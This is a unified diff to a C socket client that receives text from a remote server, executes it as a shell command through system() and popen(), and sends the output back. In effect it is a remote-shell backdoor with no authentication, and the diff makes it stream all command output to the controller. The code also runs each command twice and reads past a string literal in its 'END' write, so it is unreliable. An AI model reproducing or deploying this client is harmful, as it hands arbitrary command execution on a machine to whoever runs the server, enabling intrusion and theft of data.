@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -17,7 +19,7 @@ int main(int argc, char *argv[])
     struct sockaddr_in serv_addr;
     struct hostent *server;
 
-    char buffer[256], content[4096], line[128];
+    char buffer[256];
 
     FILE *file_p;
 
@@ -56,16 +58,15 @@ int main(int argc, char *argv[])
         system(buffer);
         file_p = popen(buffer, "r");
         if (!file_p) error("ERROR executing command");
-        bzero(content, 4096);
-        bzero(line, 128);
-        while(fgets(line, sizeof(line), file_p) != NULL && strlen(content) < 4096) {    
-            strcat(content, line);
-            bzero(line, 128);
+        bzero(buffer, 256);
+        while (fgets(buffer, 255, file_p) != NULL) {
+        	if (write(sockfd, buffer, 255) < 0)
+            	error("ERROR writing to socket");
+            bzero(buffer, 256);
         }
+        if (write(sockfd, "END", 255) < 0)
+        	error("ERROR writing to socket");
         pclose(file_p);
-        // printf("This is the output of command:\n%s\n", content);
-        if (write(sockfd,content,512) < 0)
-            error("ERROR writing to socket");
     }
     return 0;
 }
